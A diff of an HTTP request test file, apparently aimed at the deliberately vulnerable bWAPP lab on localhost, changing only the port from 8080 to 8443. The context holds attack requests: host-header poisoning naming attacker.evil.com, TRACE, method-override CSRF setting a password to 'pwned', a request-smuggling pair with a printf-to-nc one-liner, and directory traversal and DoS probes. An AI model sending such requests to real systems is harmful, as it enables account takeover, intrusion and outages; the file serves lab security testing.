@@ -21,7 +21,7 @@ Accept: text/html
 ###   If the app trusts proxy headers it will believe this over the real Host.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/hostheader_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 X-Forwarded-Host: attacker.evil.com
 X-Forwarded-For: 203.0.113.9
@@ -39,7 +39,7 @@ X-Forwarded-For: 203.0.113.9
 ### SKIP
 ### RUNNER-CANNOT-SEND: an absolute request target is rewritten to origin-form
 GET http://attacker.evil.com/hostheader_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200 - Apache serves the local vhost; a proxy in front of it may not
 
@@ -50,7 +50,7 @@ Cookie: {{authCookie}}
 ###   cross-site tracing attempt and a credential-leak vector.
 ### ---------------------------------------------------------------------------
 TRACE {{baseUrl}}/secret.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 405 Method Not Allowed (Apache has TRACE off by default)
 
@@ -66,7 +66,7 @@ Cookie: {{authCookie}}
 ###   the users table afterwards, not by trusting the 200.
 ### ---------------------------------------------------------------------------
 PUT {{baseUrl}}/csrf_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 X-HTTP-Method-Override: POST
 Content-Type: application/x-www-form-urlencoded
@@ -81,7 +81,7 @@ password=pwned&password_conf=pwned&form=submit
 ### VERB-03  Method override header on a normal POST
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/insecure_direct_object_ref_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 X-HTTP-Method-Override: DELETE
 Content-Type: application/x-www-form-urlencoded
@@ -97,12 +97,12 @@ login=A.I.M.&secret=verb-tampered&action=change
 ###   negative result if the server answers 400.
 ###   NOT SENT BY THE RUNNER: HttpWebRequest owns both headers and rewrites them,
 ###   so it cannot emit a contradictory pair. Use a raw client:
-###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8080\r\nContent-Length: 65\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/ HTTP/1.1\r\nHost: localhost:8080\r\nX-Ignore: x\r\n\r\n' | nc localhost 8080
+###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8443\r\nContent-Length: 65\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/ HTTP/1.1\r\nHost: localhost:8443\r\nX-Ignore: x\r\n\r\n' | nc localhost 8443
 ### ---------------------------------------------------------------------------
 ### SKIP
 ### RUNNER-CANNOT-SEND: Content-Length / Transfer-Encoding are rewritten by the client
 POST {{baseUrl}}/secret.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 65
@@ -111,7 +111,7 @@ Transfer-Encoding: chunked
 0
 
 GET /admin/ HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 X-Ignore: x
 ### Expected: 400 Bad Request - no desync, Apache 2.4 rejects the ambiguity
 
@@ -123,7 +123,7 @@ X-Ignore: x
 ### SKIP
 ### RUNNER-CANNOT-SEND: duplicate framing headers are collapsed by the client
 POST {{baseUrl}}/secret.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Length: 4
 Transfer-Encoding: chunked
@@ -146,7 +146,7 @@ x=1
 ###   report can state the vector exists, not to run it repeatedly.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sm_dos_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200 - resource consumption bug; do not repeat
 
@@ -157,6 +157,6 @@ Cookie: {{authCookie}}
 ###   Point `page` at /dev/zero only on a disposable container.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=/var/www/html/documents/bWAPP_intro.pdf HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, a 5 MB PDF read line-by-line and echoed - worker tied up
